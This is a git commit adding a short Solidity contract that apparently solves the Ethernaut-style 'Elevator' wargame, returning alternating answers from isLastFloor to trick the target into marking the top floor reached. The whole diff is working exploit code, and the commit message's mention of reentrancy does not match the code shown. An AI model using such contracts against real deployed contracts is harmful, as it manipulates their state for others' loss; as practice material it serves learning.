f35e34fe191d958be21b8de87147a1a62d756567
ethic41 <dahirmuhammad3@gmail.com>
2022-12-25 21:26:55 +0100

    completed reentrancy and reentrancy exploit

---
+++ contracts/attack_elevator.sol
@@ -0,0 +1,31 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./elevator.sol";
+
+
+contract AttackElevator {
+
+    Elevator elevatorContract;
+    uint num = 1;
+
+    constructor(address elevatorContractAddress) {
+        elevatorContract = Elevator(elevatorContractAddress);
+    }
+
+    function isLastFloor(uint floor) public returns (bool) {
+        floor;
+        if (num == 1) {
+            num++;
+            return false;
+        }
+        else {
+            num--;
+            return true;
+        }
+    }
+
+    function attack() public {
+        elevatorContract.goTo(100);
+    }
+}
